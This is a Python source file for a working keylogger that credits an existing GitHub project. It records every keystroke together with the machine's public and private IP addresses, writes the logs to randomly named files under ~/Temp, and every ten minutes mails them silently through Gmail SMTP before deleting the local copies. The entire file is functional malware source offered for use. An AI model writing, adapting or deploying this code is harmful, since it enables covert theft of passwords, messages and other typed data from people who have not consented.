# Reference: https://github.com/ncorbuk/Python-Keylogger

######################### Imports ##############################################
from pynput.keyboard import Key,Listener
import os
import time
import requests
import socket
import random

# SMTP protocol for sending logs to email
import smtplib
from smtplib import SMTPException
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

# Used for starting the process
import threading

# Config file containing the email username and password
import config

##################### Get User Info and Keys ###################################
datetime = time.ctime(time.time())
publicIP = requests.get('https://api.ipify.org/').text
privateIP = socket.gethostbyname(socket.gethostname())

msg = f'[START OF LOGS]\n  *~ Date/Time: {datetime}\n *~ Public-IP: {publicIP}\n  *~ Private-IP: {privateIP}\n\n'
logged_data = []
logged_data.append(msg)

delete_file = []

# Function to log the keys when they are pressed
def on_press(key):
    substitution = ['Key.enter', '[ENTER]\n', 'Key.backspace', '[BACKSPACE]', 'Key.space',
    ' ','Key.alt_l', '[ALT]', 'Key.tab', '[TAB]', 'Key.delete', '[DEL]', 'Key.ctrl_l', '[CTRL]',
    'Key.left', '[LEFT ARROW]', 'Key.right', '[RIGHT ARROW]', 'Key.shift', '[SHIFT]', '\\x13','[CTRL-S]',
    '\\x17', '[CTRL-W]', 'Key.caps_lock', '[CAPS LK]', '\\x01', '[CTRL-A]', 'Key.cmd','[WINDOWS KEY]',
    'Key.print_screen', '[PRNT SCR]', '\\x03', '[CTRL-C]', '\\x16', '[CTRL-V]']

    key = str(key).strip('\'')
    if key in substitution:
    	logged_data.append(substitution[substitution.index(key)+1])
    else:
    	logged_data.append(key)
    #print (logged_data)

# Function to write to file in the specified path
def write_file(count):
    # Set or create path ~/temp/
    base = os.path.expanduser('~')
    filepath = base + '/Temp/'
    try:
        if os.path.exists(filepath):
            pass
        else:
            os.mkdir(filepath)
            #print("Successfully created path " + filepath)
    except OSError:
        pass
        #print("Failed OS creation of " + filepath)

    # Create empty log text file
    filename = str(count) + 'log' + str(random.randint(1000000,9999999)) + '.txt'
    file = filepath + filename
    delete_file.append(file)

    # Write keys to log file
    with open(file,'w') as fp:
    	fp.write(''.join(logged_data))
    #print('written all good')

# Function to send the logs to email every 10 minutes
def send_logs():
    count = 0

    # Get login information from config files
    fromAddr = config.fromAddr
    fromPswd = config.fromPswd
    toAddr = fromAddr

    # Set timer to send every 10 minutes
    MIN = 10
    SECONDS = 60
    time.sleep(MIN * SECONDS) # Send logs every 10 minutes
    #time.sleep(10) # for debugging/testing

    test = 0
    # Log keys and construct email to be sent
    while test < 5:
        if len(logged_data) > 1:
            try:
                write_file(count)

                # Create email information
                subject = f'[{privateIP}] ~ Log {count}'
                msg = MIMEMultipart()
                msg['From'] = fromAddr
                msg['To'] = toAddr
                msg['Subject'] = subject
                body = 'testing'
                msg.attach(MIMEText(body,'plain'))

                # Attaching log file to email
                attachment = open(delete_file[0],'rb')
                filename = [i for i in delete_file[0].split('/') if ".txt" in i][0]
                #print(filename)
                part = MIMEBase('application',' octect-stream')
                part.set_payload((attachment).read())
                encoders.encode_base64(part)
                part.add_header('content-disposition','attachment;filename='+str(filename))
                msg.attach(part)

                text = msg.as_string()

                # Set up SMTP protocol
                s = smtplib.SMTP('smtp.gmail.com',587)
                s.ehlo()
                s.starttls()
                #print('Start TLS ...')
                s.ehlo()
                s.login(fromAddr,fromPswd)
                #print('Logging in ...')
                s.sendmail(fromAddr,toAddr,text)
                #print('Mail sent!')
                attachment.close()
                s.close()

                # Remove all log files
                for file in delete_file:
                    #print ("Deleting " + file)
                    os.remove(file)

                del logged_data[1:]
                del delete_file[0:]

                count += 1
                test += 1

            except Exception as errorString:
                #print('[!] send_logs // Error.. ~ %s' % (errorString))
                pass

if __name__=='__main__':
    # Begin logging process
    T1 = threading.Thread(target=send_logs)
    T1.start()
    #print("Thread starting ... ")

    # Used for registering which keys are pressed
    with Listener(on_press=on_press) as listener:
  	     listener.join()

### Test Sending Email using SMTP
"""
def send_email():
    fromAddr = config.fromAddr
    toAddr = config.fromAddr
    msg = MIMEMultipart()
    msg['From'] = fromAddr
    msg['To'] = toAddr
    msg['Subject'] = "Test"
    body = 'testing'
    msg.attach(MIMEText(body,'plain'))
    text = msg.as_string()

    try:
        s = smtplib.SMTP('smtp.gmail.com',587)
        s.ehlo()
        s.starttls()
        print('starttls')
        s.ehlo()
        s.login(fromAddr,config.fromPswd)
        print('Logging in')
        s.sendmail(fromAddr,toAddr,text)
        print('sent mail')
        s.quit()
    except SMTPException:
        print("Error sending email")
send_email()
"""
